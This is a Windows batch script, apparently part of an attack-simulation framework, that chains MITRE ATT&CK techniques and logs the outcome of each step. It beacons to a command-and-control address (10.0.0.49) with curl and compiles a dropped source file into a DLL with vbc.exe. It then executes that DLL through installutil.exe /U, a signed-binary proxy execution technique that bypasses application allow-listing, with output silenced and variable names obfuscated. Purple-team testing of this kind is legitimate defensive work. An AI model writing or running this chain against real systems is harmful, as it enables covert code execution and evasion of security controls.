@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8340\8de8450e
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8340-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=expressvp.txt
SET njozco=file.txt
SET kkjwr=8340

REM Derived variables
SET kmvg=%APPDATA%\%ufeybybm%
SET jxqps=%kmvg%\macula-simulations.log
SET yfyop=T1500
SET rmtuq=T1218
SET rzixr=T1500-Compile_After_Delivery
SET dwhml=T1218-System_Binary_Proxy_Execution

REM Initialize logging
if not exist "%kmvg%" mkdir "%kmvg%" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_started=>> "%jxqps%" 2>nul

REM 1. C2 HEARTBEAT (T1500 - Compile After Delivery initial contact)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_start=>> "%jxqps%" 2>nul
curl -k -s -o nul "%uouoq%"
SET opznv=1
SET zkorp=
if errorlevel 1 (
    SET opznv=0
    SET zkorp=connection_failed
)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-%yfyop%|%rzixr%=%opznv%:%zkorp%>> "%jxqps%" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_complete=result_%opznv%>> "%jxqps%" 2>nul

REM 2. Change to output directory
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start=%recnn%>> "%jxqps%" 2>nul
cd /d "%recnn%" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_complete=%cd%>> "%jxqps%" 2>nul

REM 3. Compile .NET DLL (T1500 continuation)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_start=%njozco%>> "%jxqps%" 2>nul
"%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\vbc.exe" /target:library /reference:System.Configuration.Install.dll "%njozco%" /out:"%hpnjatpj%" >nul 2>nul
SET ctsfl=1
SET wgfdj=
if not exist "%hpnjatpj%" (
    SET ctsfl=0
    SET wgfdj=compilation_failed
)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_complete=result_%ctsfl%>> "%jxqps%" 2>nul

REM 4. Execute via InstallUtil (T1218 - System Binary Proxy Execution)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: installutil_start=%hpnjatpj%>> "%jxqps%" 2>nul
"%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\installutil.exe" /logfile= /LogToConsole=false /U "%hpnjatpj%" >nul 2>nul
SET xceqz=1
SET puvrh=
if errorlevel 1 (
    SET xceqz=0
    SET puvrh=execution_failed
)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-%rmtuq%|%dwhml%=%xceqz%:%puvrh%>> "%jxqps%" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: installutil_complete=result_%xceqz%>> "%jxqps%" 2>nul

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_completed=>> "%jxqps%" 2>nul
ENDLOCAL